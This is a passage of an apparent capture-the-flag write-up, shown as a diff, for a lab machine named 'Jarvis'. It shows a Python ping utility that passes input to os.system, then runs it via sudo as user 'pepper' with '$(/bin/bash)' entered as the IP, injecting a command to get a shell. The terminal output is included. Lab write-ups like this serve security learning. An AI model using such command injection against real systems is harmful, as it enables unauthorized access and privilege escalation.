@@ -324,4 +324,47 @@ def exec_ping():
             print('Got you')
             exit()
     os.system('ping ' + command)
+    
 ```
+
+#### Using the command you can test a ping
+``sudo -u pepper /var/www/Admin-Utilities/simpler.py -p``
+
+#### However, instead of putting the IP I put ``$(/bin/bash)`` and get shell pepper, But I wasn't getting feedback when giving commands
+
+```
+www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+<do -u pepper /var/www/Admin-Utilities/simpler.py -p
+***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+
+Enter an IP: $(/bin/bash)
+$(/bin/bash)
+pepper@jarvis:/var/www/Admin-Utilities$ ls
+ls
+pepper@jarvis:/var/www/Admin-Utilities$ whoami
+whoami
+pepper@jarvis:/var/www/Admin-Utilities$ 
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
